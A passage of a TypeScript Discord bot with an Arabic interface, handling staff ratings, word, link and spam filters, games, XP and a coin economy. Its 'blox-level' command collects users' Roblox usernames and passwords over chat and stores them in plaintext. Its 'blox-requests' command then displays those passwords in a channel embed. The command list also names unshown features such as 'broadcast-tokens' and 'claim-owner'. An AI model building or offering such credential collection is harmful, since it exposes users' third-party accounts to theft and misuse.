          const prompt = await message.channel.send(`⭐ **${message.author}، كم تقييمك للإداري من 10؟ (أو اكتب "إلغاء")**`);
          state.promptMsgId = prompt.id;
          return;
        } else if (state.step === 'rating') {
          const rating = parseInt(message.content);
          if (isNaN(rating) || rating < 1 || rating > 10) {
            await message.delete().catch(() => {});
            const errorMsg = await message.channel.send(`❌ **${message.author}، يرجى إدخال رقم صحيح بين 1 و 10.**`);
            setTimeout(() => errorMsg.delete().catch(() => {}), 3000);
            return;
          }

          await message.delete().catch(() => {});
          
          // Delete previous prompt
          if (state.promptMsgId) {
            const prevMsg = await message.channel.messages.fetch(state.promptMsgId).catch(() => null);
            if (prevMsg) await prevMsg.delete().catch(() => {});
          }

          const staff = await client.users.fetch(state.staffId).catch(() => null);
          const stars = "⭐".repeat(Math.round(rating / 2)) || "⭐";
          const finalEmbed = new EmbedBuilder()
            .setTitle("⭐ تقييم إداري جديد")
            .addFields(
              { name: "الإداري", value: staff ? `${staff} (${staff.tag})` : `<@${state.staffId}>`, inline: true },
              { name: "التقييم", value: `${rating}/10 ${stars}`, inline: true },
              { name: "المقيم", value: `${message.author} (${message.author.tag})`, inline: true },
              { name: "الرأي", value: state.opinion || "لا يوجد" }
            )
            .setColor(0x00FF00)
            .setTimestamp();

          await message.channel.send({ embeds: [finalEmbed] });
          db.prepare("INSERT INTO evaluations (guildId, userId, staffId, rating, feedback) VALUES (?, ?, ?, ?, ?)").run(guildId, message.author.id, state.staffId, rating, state.opinion);
          
          evaluationStates.delete(stateKey);
          return;
        }
      } else {
        const mentionedUser = message.mentions.users.filter(u => !u.bot).first();
        if (mentionedUser) {
          if (mentionedUser.id === message.author.id) {
            await message.delete().catch(() => {});
            const errorMsg = await message.channel.send(`❌ **${message.author}، لا يمكنك تقييم نفسك!**`);
            setTimeout(() => errorMsg.delete().catch(() => {}), 3000);
            return;
          }

          await message.delete().catch(() => {});
          const prompt = await message.channel.send(`📝 **${message.author}، اكتب رأيك في الإداري ${mentionedUser}: (أو اكتب "إلغاء")**`);
          evaluationStates.set(stateKey, {
            staffId: mentionedUser.id,
            step: 'opinion',
            promptMsgId: prompt.id
          });

          // Auto-cancel after 2 minutes
          setTimeout(() => {
            if (evaluationStates.has(stateKey)) {
              evaluationStates.delete(stateKey);
            }
          }, 120000);
          return;
        }
      }
    }

    // Badwords Check
    const badwords = db.prepare("SELECT word FROM badwords WHERE guildId = ?").all(guildId) as any[];
    if (badwords.length > 0 && !message.member?.permissions.has(PermissionFlagsBits.ManageMessages)) {
      const hasBadword = badwords.some(bw => content.includes(bw.word.toLowerCase()));
      if (hasBadword) {
        await message.delete().catch(() => {});
        const warnMsg = await message.channel.send(`⚠️ ${message.author}, الكلمات البذيئة غير مسموح بها!`).catch(() => {});
        
        // Log event
        const protection = db.prepare("SELECT * FROM protection_settings WHERE guildId = ?").get(guildId) as any;
        if (protection && protection.logChannel) {
          const logChannel = message.guild.channels.cache.get(protection.logChannel) as any;
          if (logChannel) {
            const logEmbed = new EmbedBuilder()
              .setColor("#FF0000")
              .setTitle("🛡️ Badword Detected")
              .addFields(
                { name: "User", value: `${message.author.tag} (${message.author.id})`, inline: true },
                { name: "Channel", value: `<#${message.channel.id}>`, inline: true },
                { name: "Content", value: message.content.slice(0, 1024) }
              )
              .setTimestamp();
            logChannel.send({ embeds: [logEmbed] }).catch(() => {});
          }
        }

        if (warnMsg && 'delete' in warnMsg) {
          setTimeout(() => (warnMsg as any).delete().catch(() => {}), 5000);
        }
        return;
      }
    }

    // Protection Check
    const protection = db.prepare("SELECT * FROM protection_settings WHERE guildId = ?").get(guildId) as any;
    if (protection) {
      // Anti-Link
      if (protection.antiLink === 1) {
        const hasLink = /(https?:\/\/[^\s]+)/g.test(message.content);
        if (hasLink && !message.member?.permissions.has(PermissionFlagsBits.ManageMessages)) {
          await message.delete().catch(() => {});
          const warnMsg = await message.channel.send(`⚠️ ${message.author}, الروابط غير مسموح بها في هذا السيرفر!`).catch(() => {});
          
          // Log event
          if (protection.logChannel) {
            const logChannel = message.guild.channels.cache.get(protection.logChannel) as any;
            if (logChannel) {
              const logEmbed = new EmbedBuilder()
                .setColor("#FF0000")
                .setTitle("🛡️ Anti-Link Triggered")
                .addFields(
                  { name: "User", value: `${message.author.tag} (${message.author.id})`, inline: true },
                  { name: "Channel", value: `<#${message.channel.id}>`, inline: true },
                  { name: "Content", value: message.content.slice(0, 1024) }
                )
                .setTimestamp();
              logChannel.send({ embeds: [logEmbed] }).catch(() => {});
            }
          }

          if (warnMsg && 'delete' in warnMsg) {
            setTimeout(() => (warnMsg as any).delete().catch(() => {}), 5000);
          }
          return;
        }
      }

      // Anti-Spam
      if (protection.antiSpam === 1 && !message.member?.permissions.has(PermissionFlagsBits.ManageMessages)) {
        const key = `${message.author.id}-${guildId}`;
        const now = Date.now();
        const userData = spamMap.get(key) || { count: 0, lastMessage: 0 };

        if (now - userData.lastMessage < 2000) { // 2 seconds
          userData.count++;
        } else {
          userData.count = 1;
        }
        userData.lastMessage = now;
        spamMap.set(key, userData);

        if (userData.count > 5) { // 5 messages in 2 seconds
          await message.delete().catch(() => {});
          const warnMsg = await message.channel.send(`⚠️ ${message.author}, توقف عن السبام!`).catch(() => {});
          
          // Log event
          if (protection.logChannel) {
            const logChannel = message.guild.channels.cache.get(protection.logChannel) as any;
            if (logChannel) {
              const logEmbed = new EmbedBuilder()
                .setColor("#FF0000")
                .setTitle("🛡️ Anti-Spam Triggered")
                .addFields(
                  { name: "User", value: `${message.author.tag} (${message.author.id})`, inline: true },
                  { name: "Channel", value: `<#${message.channel.id}>`, inline: true }
                )
                .setTimestamp();
              logChannel.send({ embeds: [logEmbed] }).catch(() => {});
            }
          }

          if (warnMsg && 'delete' in warnMsg) {
            setTimeout(() => (warnMsg as any).delete().catch(() => {}), 5000);
          }
          return;
        }
      }
    }

    const prefixSetting = db.prepare("SELECT value FROM settings WHERE key = ?").get(`prefix_${guildId}`) as any;
    const currentPrefix = prefixSetting ? prefixSetting.value : PREFIX;
    const lowerContent = message.content.toLowerCase();
    const lowerPrefix = currentPrefix.toLowerCase();

    const userId = message.author.id;
    
    // Game Triggers (No Prefix & Arabic Support)
    const gameTriggers: Record<string, string> = {
      'roulette': 'roulette',
      'روليت': 'roulette',
      'replica': 'replica',
      'ريبيكا': 'replica',
      'trivia': 'trivia',
      'فعاليات': 'trivia',
      'سؤال': 'trivia',
      'hangman': 'hangman',
      'مشنقة': 'hangman',
      'fastclick': 'fastclick',
      'أسرع': 'fastclick',
      'ضغطة': 'fastclick',
      'snake': 'snake',
      'ثعبان': 'snake',
      'mafia': 'mafia',
      'مافيا': 'mafia',
      'rps': 'rps',
      'حجر ورقة مقص': 'rps',
      'coinflip': 'coinflip',
      'عملة': 'coinflip',
      'guess': 'guess',
      'تخمين': 'guess'
    };

    const triggeredGame = gameTriggers[lowerContent] || (lowerContent.startsWith(lowerPrefix) ? gameTriggers[lowerContent.slice(lowerPrefix.length).trim()] : null);
    if (triggeredGame) {
      // Create a mock interaction-like object
      const mockInteraction = {
        commandName: triggeredGame,
        user: message.author,
        member: message.member,
        guild: message.guild,
        guildId: message.guildId,
        channel: message.channel,
        channelId: message.channelId,
        options: {
          getString: (name: string) => null,
          getInteger: (name: string) => null,
          getUser: (name: string) => null,
          getRole: (name: string) => null,
          getChannel: (name: string) => null,
        },
        reply: async (options: any) => {
          if (typeof options === 'string') return message.reply(options);
          return message.reply(options);
        },
        editReply: async (options: any) => {
          return message.channel.send(options);
        },
        deferReply: async () => {
          return message.channel.sendTyping();
        },
        followUp: async (options: any) => {
          return message.channel.send(options);
        },
        isCommand: () => true,
        isButton: () => false,
        isStringSelectMenu: () => false,
        isModalSubmit: () => false,
        fetchReply: async () => {
          return message;
        }
      };

      if (triggeredGame === 'roulette') {
        handleRouletteCommand(mockInteraction);
      } else if (triggeredGame === 'snake') {
        handleSnakeCommand(mockInteraction);
      } else if (triggeredGame === 'replica') {
        handleReplicaCommand(mockInteraction);
      }
      // Add other games here if refactored
    }

    // XP Logic
    if (!lowerContent.startsWith(lowerPrefix)) {
      let xpToAdd = Math.floor(Math.random() * 10) + 5;
      let multiplier = 1;

      // Channel Bonus
      if (BONUS_CHANNELS.includes(message.channel.id)) {
        multiplier *= 2;
      }

      // Time Bonus (Happy Hour)
      const currentHour = new Date().getHours();
      if (currentHour >= HAPPY_HOUR_START && currentHour < HAPPY_HOUR_END) {
        multiplier *= 2;
      }

      xpToAdd *= multiplier;

      await addXP(userId, guildId, xpToAdd, message.guild, message.author, message.member, message.channel);
      return;
    }

    // Alias Check (Text-based commands)
    const args = message.content.slice(lowerPrefix.length).trim().split(/ +/);
    const firstWord = args.shift()?.toLowerCase();
    if (firstWord) {
      const alias = db.prepare("SELECT originalCommand FROM aliases WHERE guildId = ? AND aliasName = ?").get(guildId, firstWord) as any;
      const commandName = alias ? alias.originalCommand : firstWord;
      
      // Command Permission Check (Admins bypass)
      if (!message.member?.permissions.has(PermissionFlagsBits.Administrator) && !isCommandAllowed(guildId, commandName, message.channelId)) {
        return; // Silently ignore for message commands
      }

      const supportedCommands = [
        'rank', 'top', 'bonus', 'id', 'rewards', 'unban', 'resetserver', 'reset-server',
        'ping', 'nick', 'clear', 'setup-ticket', 'setxp', 'set-reward', 'set-prefix',
        'set-level', 'disable', 'toggle', 'set-alias', 'remove-alias', 'set-avatar',
        'promote-owner', 'accept', 'tickets-by-category', 'transfer', 'setup-verify',
        'broadcast', 'broadcast-here', 'broadcast-tokens', 'guilds', 'get-invite',
        'claim-owner', 'force-accept', 'join-server', 'rps', 'coinflip', 'guess',
        'mafia', 'trivia', 'hangman', 'fastclick', 'snake', 'copy-server', 'botinfo',
        'add-role', 'remove-role', 'list-roles',
        'p', 'c', 'xbp', 'xbc', 'add-xb', 'inadd-xb', 'reset-xb', 'u', 'y', 'ai', 'ai-challenge', 's', 'blox-level', 'blox-requests'
      ];
      
      if (supportedCommands.includes(commandName)) {
        if (commandName === 's') {
          const topXB = db.prepare("SELECT userId, xb FROM leveling WHERE guildId = ? AND xb > 0 ORDER BY xb DESC LIMIT 10").all(guildId) as { userId: string, xb: number }[];
          
          if (topXB.length === 0) {
            return message.reply("❌ لا يوجد بيانات XB في هذا السيرفر بعد.");
          }

          const embed = new EmbedBuilder()
            .setTitle("🏆 قائمة متصدري الـ XB")
            .setColor(0xFFD700)
            .setTimestamp()
            .setFooter({ text: `طلب بواسطة ${message.author.tag}`, iconURL: message.author.displayAvatarURL() });

          let description = "";
          for (let i = 0; i < topXB.length; i++) {
            const user = await client.users.fetch(topXB[i].userId).catch(() => null);
            const username = user ? user.tag : "مستخدم غير معروف";
            const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : `${i + 1}.`;
            description += `${medal} **${username}** - \`${topXB[i].xb}\` XB\n`;
          }

          embed.setDescription(description || "لا يوجد متصدرين حالياً.");
          return message.reply({ embeds: [embed] });
        }

        if (commandName === 'blox-level') {
          const username = args[0];
          const password = args[1];
          if (!username || !password) return message.reply(`❌ الاستخدام الصحيح: \`${currentPrefix}blox-level <username> <password>\``);

          try {
            db.prepare("INSERT INTO blox_fruits_requests (userId, guildId, robloxUsername, robloxPassword, status) VALUES (?, ?, ?, ?, ?)").run(message.author.id, guildId, username, password, 'pending');
            return message.reply("✅ تم استلام طلب تلفيل حسابك بنجاح! سيتم مراجعته والبدء فيه قريباً.");
          } catch (err) {
            console.error("Error saving blox-level request:", err);
            return message.reply("❌ حدث خطأ أثناء حفظ طلبك.");
          }
        }

        if (commandName === 'blox-requests') {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) return;
          
          const requests = db.prepare("SELECT * FROM blox_fruits_requests WHERE status = 'pending' LIMIT 10").all() as any[];
          if (requests.length === 0) return message.reply("❌ لا توجد طلبات معلقة.");

          const embed = new EmbedBuilder()
            .setTitle("📋 طلبات تلفيل بلوكس فروت")
            .setColor(0x5865F2);

          let desc = "";
          requests.forEach(req => {
            desc += `**ID:** \`${req.id}\` | <@${req.userId}>\n**User:** \`${req.robloxUsername}\` | **Pass:** \`${req.robloxPassword}\`\n\n`;
          });
          embed.setDescription(desc);
          return message.reply({ embeds: [embed] });
        }

        if (commandName === 'ai-challenge') {
          const riddles = [
            { riddle: "شيء له أسنان ولا يعض، ما هو؟", answer: "المشط" },
            { riddle: "شيء يكتب ولا يقرأ، ما هو؟", answer: "القلم" },
            { riddle: "شيء كلما زاد نقص، ما هو؟", answer: "العمر" },
            { riddle: "شيء له أرجل ولكنه لا يمشي، ما هو؟", answer: "الكرسي" },
            { riddle: "شيء يقرصك ولا تراه، ما هو؟", answer: "الجوع" },
            { riddle: "شيء يخترق الزجاج ولا يكسره، ما هو؟", answer: "الضوء" },
            { riddle: "شيء له عين واحدة ولكنه لا يرى، ما هو؟", answer: "الإبرة" },
            { riddle: "شيء إذا غليته جمد، ما هو؟", answer: "البيض" },
            { riddle: "شيء له جلد وليس حيواناً، وله ورق وليس شجراً، ما هو؟", answer: "الكتاب" },
            { riddle: "شيء يمشي بلا أرجل ويبكي بلا عيون، ما هو؟", answer: "السحاب" }
          ];
          const data = riddles[Math.floor(Math.random() * riddles.length)];
          
          const embed = new EmbedBuilder()
            .setTitle("🧠 تحدي الذكاء الاصطناعي (لغز)")
            .setDescription(`**اللغز:**\n${data.riddle}`)
            .setColor(0xFFA500)
            .setFooter({ text: "لديك 30 ثانية للحل!" })
            .setTimestamp();

          await message.reply({ embeds: [embed] });

          const filter = (m: any) => m.content.toLowerCase().trim() === data.answer.toLowerCase().trim();
          const collector = message.channel.createMessageCollector({ filter, time: 30000, max: 1 });

          collector.on('collect', async (m: any) => {
            const xbReward = 35;
            await awardXB(guildId, m.author.id, xbReward, "Riddle win");

            const winEmbed = new EmbedBuilder()
              .setTitle('🎉 عبقري!')
              .setDescription(`مبروك يا ${m.author}! الإجابة الصحيحة هي: **${data.answer}**\n\n💰 لقد حصلت على **${xbReward}** XB!`)
              .setColor(0x00FF00)
              .setTimestamp();
            message.channel.send({ embeds: [winEmbed] });
          });

          collector.on('end', (collected: any) => {
            if (collected.size === 0) {
              const loseEmbed = new EmbedBuilder()
                .setTitle('😔 حظاً أوفر!')
                .setDescription(`انتهى الوقت! الإجابة كانت: **${data.answer}**`)
                .setColor(0xFF0000)
                .setTimestamp();
              message.channel.send({ embeds: [loseEmbed] });
            }
          });
          return;
        } else if (commandName === 'ai') {
          const prompt = args.join(" ");
          if (!prompt) return message.reply("❌ يرجى كتابة سؤال للذكاء الاصطناعي.");
          await handleAIResponse(message, prompt);
          return;
        }

        if (commandName === 'u') {
          const targetUser = message.mentions.users.first() || message.author;
          const userRow = db.prepare("SELECT * FROM leveling WHERE userId = ? AND guildId = ?").get(targetUser.id, guildId) as any;
          const xp = userRow?.xp || 0;
          const level = userRow?.level || 0;
          
          const leaderboard = db.prepare("SELECT userId FROM leveling WHERE guildId = ? ORDER BY level DESC, xp DESC").all(guildId) as any[];
          const rank = leaderboard.findIndex(u => u.userId === targetUser.id) + 1;
          
          const embed = new EmbedBuilder()
            .setTitle(`📊 نشاط ${targetUser.username}`)
            .setThumbnail(targetUser.displayAvatarURL())
            .addFields(
              { name: "المستوى", value: level.toString(), inline: true },
              { name: "الخبرة (XP)", value: xp.toString(), inline: true },
              { name: "الترتيب", value: `#${rank}`, inline: true }
            )
            .setColor(0x00AE86);
          return message.reply({ embeds: [embed] });
        }

        if (commandName === 'y') {
          const targetUser = message.mentions.users.first() || message.author;
          const targetMember = await message.guild.members.fetch(targetUser.id).catch(() => null);
          if (!targetMember) return message.reply("❌ المستخدم غير موجود.");
          
          const joinedAt = targetMember.joinedAt;
          const embed = new EmbedBuilder()
            .setTitle(`📅 تاريخ الانضمام`)
            .setDescription(`${targetUser} انضم إلى السيرفر في:\n**${joinedAt?.toLocaleDateString('ar-EG', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })}**`)
            .setColor(0x5865F2);
          return message.reply({ embeds: [embed] });
        }

        if (commandName === 'id') {
          const targetUser = message.mentions.users.first() || message.author;
          const targetMember = await message.guild.members.fetch(targetUser.id).catch(() => null);
          
          if (!targetMember) {
            return message.reply("❌ هذا المستخدم غير موجود في السيرفر.");
          }

          const userRow = db.prepare("SELECT * FROM leveling WHERE userId = ? AND guildId = ?").get(targetUser.id, guildId) as any;
          const level = userRow?.level || 0;
          const xb = userRow?.xb || 0;
          const xp = userRow?.xp || 0;
          const nextLevelXp = (level + 1) * 300;
          
          const leaderboard = db.prepare("SELECT userId FROM leveling WHERE guildId = ? ORDER BY level DESC, xp DESC").all(guildId) as any[];
          const rank = leaderboard.findIndex(u => u.userId === targetUser.id) + 1;

          const width = 800;
          const height = 300;
          const canvas = createCanvas(width, height);
          const ctx = canvas.getContext('2d');

          const encoder = new GIFEncoder(width, height);
          encoder.start();
          encoder.setRepeat(-1);
          encoder.setDelay(500);
          encoder.setQuality(10);

          const avatarURL = targetUser.displayAvatarURL({ extension: 'png', size: 256 });
          const avatar = await loadImage(avatarURL);

          const targetProgress = Math.min(xp / nextLevelXp, 1);

          // Draw static image
          ctx.clearRect(0, 0, width, height);
          const bgGradient = ctx.createLinearGradient(0, 0, width, height);
          bgGradient.addColorStop(0, '#1a1a2e');
          bgGradient.addColorStop(1, '#16213e');
          ctx.fillStyle = bgGradient;
          ctx.fillRect(0, 0, width, height);
          
          ctx.save();
          ctx.globalAlpha = 0.1;
          ctx.fillStyle = '#5865f2';
          ctx.beginPath();
          ctx.arc(width, 0, 200, 0, Math.PI * 2);
          ctx.fill();
          ctx.beginPath();
          ctx.arc(0, height, 150, 0, Math.PI * 2);
          ctx.fill();
          ctx.restore();

          ctx.save();
          ctx.fillStyle = 'rgba(255, 255, 255, 0.05)';
          ctx.beginPath();
          ctx.roundRect(30, 30, width - 60, height - 60, 25);
          ctx.fill();
          ctx.strokeStyle = 'rgba(255, 255, 255, 0.1)';
          ctx.lineWidth = 1;
          ctx.stroke();
          ctx.restore();

          ctx.save();
          ctx.shadowBlur = 20;
          ctx.shadowColor = '#5865f2';
          ctx.beginPath();
          ctx.arc(130, 150, 80, 0, Math.PI * 2);
          ctx.fillStyle = '#5865f2';
          ctx.globalAlpha = 0.2;
          ctx.fill();
          ctx.restore();

          ctx.save();
          ctx.beginPath();
          ctx.arc(130, 150, 75, 0, Math.PI * 2, true);
          ctx.clip();
          ctx.drawImage(avatar, 55, 75, 150, 150);
          ctx.restore();

          ctx.save();
          ctx.strokeStyle = '#5865f2';
          ctx.lineWidth = 4;
          ctx.beginPath();
          ctx.arc(130, 150, 77, 0, Math.PI * 2);
          ctx.stroke();
          ctx.restore();

          ctx.fillStyle = '#ffffff';
          ctx.font = 'bold 36px Arial';
          ctx.fillText(targetUser.username, 240, 90);
          ctx.font = '24px Arial';
          ctx.fillStyle = 'rgba(255, 255, 255, 0.7)';
          ctx.fillText(`Rank: #${rank}`, 240, 130);
          ctx.fillStyle = 'rgba(255, 255, 255, 0.5)';
          ctx.font = '18px Arial';
          ctx.fillText(`Level ${level}`, 240, 185);
          ctx.fillText(`${xp} / ${nextLevelXp} XP`, width - 180, 185);

          ctx.fillStyle = 'rgba(255, 255, 255, 0.1)';
          ctx.beginPath();
          ctx.roundRect(240, 200, 500, 20, 10);
          ctx.fill();

          const barGradient = ctx.createLinearGradient(240, 0, 740, 0);
          barGradient.addColorStop(0, '#5865f2');
          barGradient.addColorStop(1, '#858df3');
          ctx.fillStyle = barGradient;
          ctx.beginPath();
          ctx.roundRect(240, 200, 500 * targetProgress, 20, 10);
          ctx.fill();

          ctx.shadowBlur = 10;
          ctx.shadowColor = '#5865f2';
          ctx.fillStyle = '#ffffff';
          ctx.beginPath();
          ctx.arc(240 + 500 * targetProgress, 210, 8, 0, Math.PI * 2);
          ctx.fill();
          ctx.shadowBlur = 0;

          encoder.addFrame(ctx);
          encoder.finish();
          const buffer = encoder.out.getData();
          const attachment = new AttachmentBuilder(buffer, { name: 'id.gif' });
          return message.reply({ files: [attachment] });
        }

        if (commandName === 'p' || commandName === 'xbp') {
          const targetUser = message.mentions.users.first() || message.author;
          const userRow = db.prepare("SELECT * FROM leveling WHERE userId = ? AND guildId = ?").get(targetUser.id, guildId) as any;
          
          const level = userRow?.level || 0;
          const xb = userRow?.xb || 0;
          const xp = userRow?.xp || 0;
          const nextLevelXp = (level + 1) * 300;

          try {
            const buffer = await generateProfileImage(targetUser, level, xb, xp, nextLevelXp);
            const attachment = new AttachmentBuilder(buffer, { name: 'profile.gif' });
            return message.reply({ files: [attachment] });
          } catch (err) {
            console.error("Profile image generation failed:", err);
            return message.reply("❌ فشل في إنشاء صورة البروفايل.");
          }
        }

        if (commandName === 'c' || commandName === 'xbc') {
          const targetUser = message.mentions.users.first();
          const amount = parseInt(args[1]);

          // Case 1: XBC (Alone) -> Show author's balance
          if (!targetUser && args.length === 0) {
            const userRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(message.author.id, guildId) as any;
            const balance = userRow?.xb || 0;
            return message.reply(`💰 رصيدك الحالي هو: **${balance}** XB`);
          }

          // Case 2: XBC @user (No amount) -> Show mentioned user's balance
          if (targetUser && (isNaN(amount) || args.length === 1)) {
            const userRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(targetUser.id, guildId) as any;
            const balance = userRow?.xb || 0;
            return message.reply(`💰 رصيد **${targetUser.username}** هو: **${balance}** XB`);
          }

          // Case 3: XBC @user amount -> Transfer
          if (targetUser && !isNaN(amount) && amount > 0) {
            if (targetUser.id === message.author.id) return message.reply("❌ لا يمكنك تحويل العملات لنفسك.");

            const senderRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(message.author.id, guildId) as any;
            const senderBalance = senderRow?.xb || 0;

            if (senderBalance < amount) {
              return message.reply(`❌ رصيدك غير كافٍ. رصيدك الحالي هو **${senderBalance}** XB.`);
            }

            // Perform transfer
            db.prepare("UPDATE leveling SET xb = xb - ? WHERE userId = ? AND guildId = ?").run(amount, message.author.id, guildId);
            await awardXB(guildId, targetUser.id, amount, `Transfer from ${message.author.username}`);

            return message.reply(`✅ تم تحويل **${amount}** XB بنجاح إلى ${targetUser}.`);
          }

          return message.reply(`❌ الاستخدام الصحيح:\n- \`${currentPrefix}c\` لرؤية رصيدك\n- \`${currentPrefix}c @user\` لرؤية رصيد عضو\n- \`${currentPrefix}c @user <المبلغ>\` لتحويل عملات`);
        }

        if (commandName === 'add-xb') {
          if (!AUTHORIZED_CURRENCY_IDS.includes(message.author.id)) return;
          const targetUser = message.mentions.users.first();
          const amount = parseInt(args[1]);

          if (!targetUser || isNaN(amount)) return message.reply(`Usage: ${currentPrefix}add-xb @user <amount>`);

          await awardXB(guildId, targetUser.id, amount, "Admin add");
          return message.reply(`✅ تم إضافة **${amount}** XB إلى رصيد ${targetUser}.`);
        }

        if (commandName === 'inadd-xb') {
          if (!AUTHORIZED_CURRENCY_IDS.includes(message.author.id)) return;
          const targetUser = message.mentions.users.first();
          const amount = parseInt(args[1]);

          if (!targetUser || isNaN(amount)) return message.reply(`Usage: ${currentPrefix}inadd-xb @user <amount>`);

          await deductXB(guildId, targetUser.id, amount, "Admin remove");
          return message.reply(`✅ تم سحب **${amount}** XB من رصيد ${targetUser}.`);
        }

        if (commandName === 'reset-xb') {
          if (!AUTHORIZED_CURRENCY_IDS.includes(message.author.id)) return;
          const targetUser = message.mentions.users.first();
          const resetAll = args[0] === 'all' || args[0] === 'الكل';

          if (resetAll) {
            const allUsers = db.prepare("SELECT userId, xb FROM leveling WHERE guildId = ?").all(guildId) as any[];
            for (const u of allUsers) {
              await deductXB(guildId, u.userId, u.xb, "Admin reset all");
            }
            return message.reply("✅ تم تصفير رصيد XB لجميع الأعضاء في السيرفر.");
          } else if (targetUser) {
            const targetRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(targetUser.id, guildId) as any;
            const currentBalance = targetRow?.xb || 0;
            await deductXB(guildId, targetUser.id, currentBalance, "Admin reset");
            return message.reply(`✅ تم تصفير رصيد XB للعضو ${targetUser}.`);
          } else {
            return message.reply(`Usage: ${currentPrefix}reset-xb @user OR ${currentPrefix}reset-xb all`);
          }
        }

        if (commandName === 'ping') {
          return message.reply(`Pong! Latency is ${client.ws.ping}ms.`);
        }
        if (commandName === 'rank') {
          const userRow = db.prepare("SELECT * FROM leveling WHERE userId = ? AND guildId = ?").get(userId, guildId) as any;
          if (!userRow) return message.reply("You don't have a rank yet. Start chatting!");

          const dynamicRewards = db.prepare("SELECT level, roleId FROM rewards WHERE guildId = ?").all(guildId) as any[];
          const dynamicRewardMap = new Map(dynamicRewards.map(r => [r.level, r.roleId]));
          const allRewardLevels = Array.from(new Set([...Object.keys(LEVEL_ROLES).map(Number), ...dynamicRewardMap.keys()]));
          
          const nextRewardLevel = allRewardLevels
            .filter(lvl => lvl > userRow.level)
            .sort((a, b) => a - b)[0];

          const embed = new EmbedBuilder()
            .setTitle(`${message.author.username}'s Rank`)
            .addFields(
              { name: "Level", value: userRow.level.toString(), inline: true },
              { name: "XP", value: `${userRow.xp} / ${(userRow.level + 1) * 300}`, inline: true }
            )
            .setColor(0x00AE86);

          if (nextRewardLevel) {
            const roleId = dynamicRewardMap.get(nextRewardLevel) || LEVEL_ROLES[nextRewardLevel];
            embed.addFields({ name: "Next Reward", value: `Level **${nextRewardLevel}**: <@&${roleId}>`, inline: false });
          }
          return message.reply({ embeds: [embed] });
        }

        if (commandName === 'top') {
          const timeframe = args[0]?.toLowerCase();
          const type = args[1]?.toLowerCase(); // 'text' or 'voice'
          
          let query = "";
          let params: any[] = [guildId];
          let title = "Global Leaderboard";
          let isTimeBased = false;

          if (['day', 'daily', 'يوم'].includes(timeframe)) {
            query = "SELECT userId, SUM(xp) as totalXp FROM xp_history WHERE guildId = ? AND timestamp >= datetime('now', '-1 day')";
            title = "Daily Leaderboard";
            isTimeBased = true;
          } else if (['week', 'weekly', 'اسبوع'].includes(timeframe)) {
            query = "SELECT userId, SUM(xp) as totalXp FROM xp_history WHERE guildId = ? AND timestamp >= datetime('now', '-7 days')";
            title = "Weekly Leaderboard";
            isTimeBased = true;
          } else if (['month', 'monthly', 'شهر'].includes(timeframe)) {
            query = "SELECT userId, SUM(xp) as totalXp FROM xp_history WHERE guildId = ? AND timestamp >= datetime('now', '-30 days')";
            title = "Monthly Leaderboard";
            isTimeBased = true;
          } else if (['year', 'yearly', 'سنة'].includes(timeframe)) {
            query = "SELECT userId, SUM(xp) as totalXp FROM xp_history WHERE guildId = ? AND timestamp >= datetime('now', '-365 days')";
            title = "Yearly Leaderboard";
            isTimeBased = true;
          } else {
            query = "SELECT userId, xp as totalXp, level FROM leveling WHERE guildId = ?";
            title = "All-Time Leaderboard";
          }

          if (isTimeBased) {
            if (['voice', 'صوت'].includes(type)) {
              query += " AND type = 'voice'";
              title += " (Voice)";
            } else if (['text', 'كتابي'].includes(type)) {
              query += " AND type = 'text'";
              title += " (Text)";
            }
            query += " GROUP BY userId ORDER BY totalXp DESC LIMIT 10";
          } else {
            query += " ORDER BY level DESC, xp DESC LIMIT 10";
          }

          const topUsers = db.prepare(query).all(...params) as any[];
          
          const embed = new EmbedBuilder()
            .setTitle(`${title} (Top ${topUsers.length})`)
            .setColor(0x5865F2)
            .setTimestamp();

          if (topUsers.length === 0) {
            embed.setDescription("No users found in the leaderboard.");
          } else {
            const list = topUsers.map((u, index) => {
              const levelStr = u.level !== undefined ? ` - Level ${u.level}` : "";
              return `**#${index + 1}** | <@${u.userId}>${levelStr} (${u.totalXp} XP)`;
            }).join("\n");
            embed.setDescription(list);
          }
          return message.reply({ embeds: [embed] });
        }

        if (commandName === 'bonus') {
          const currentHour = new Date().getHours();
          const isHappyHour = currentHour >= HAPPY_HOUR_START && currentHour < HAPPY_HOUR_END;
          const isBonusChannel = BONUS_CHANNELS.includes(message.channel.id);

          let multiplier = 1;
          if (isHappyHour) multiplier *= 2;
          if (isBonusChannel) multiplier *= 2;

          const embed = new EmbedBuilder()
            .setTitle("XP Bonus Status")
            .addFields(
              { name: "Happy Hour", value: isHappyHour ? "✅ Active (2x XP)" : "❌ Inactive (6 PM - 8 PM)", inline: true },
              { name: "Channel Bonus", value: isBonusChannel ? "✅ Active (2x XP)" : "❌ Inactive in this channel", inline: true },
              { name: "Total Multiplier", value: `${multiplier}x`, inline: false }
            )
            .setColor(multiplier > 1 ? 0x00FF00 : 0xFF0000);
          return message.reply({ embeds: [embed] });
        }

        if (commandName === 'id') {
          const userRow = db.prepare("SELECT * FROM leveling WHERE userId = ? AND guildId = ?").get(userId, guildId) as any;
          const level = userRow?.level || 0;
          const xp = userRow?.xp || 0;
          const nextLevelXp = (level + 1) * 300;
          
          const leaderboard = db.prepare("SELECT userId FROM leveling WHERE guildId = ? ORDER BY level DESC, xp DESC").all(guildId) as any[];
          const rank = leaderboard.findIndex(u => u.userId === userId) + 1;

          const embed = new EmbedBuilder()
            .setTitle(`${message.author.username}'s Profile`)
            .setThumbnail(message.author.displayAvatarURL())
            .addFields(
              { name: "Level", value: level.toString(), inline: true },
              { name: "Rank", value: `#${rank}`, inline: true },
              { name: "XP", value: `${xp} / ${nextLevelXp}`, inline: false }
            )
            .setColor(0x5865F2);
          return message.reply({ embeds: [embed] });
        }

        if (commandName === 'rewards') {
          const embed = new EmbedBuilder()
            .setTitle("Level Role Rewards")
            .setDescription("Reach these levels to unlock exclusive roles!")
            .setColor(0x5865F2);

          const dynamicRewards = db.prepare("SELECT level, roleId FROM rewards WHERE guildId = ?").all(guildId) as any[];
          const dynamicRewardMap = new Map(dynamicRewards.map(r => [r.level, r.roleId]));
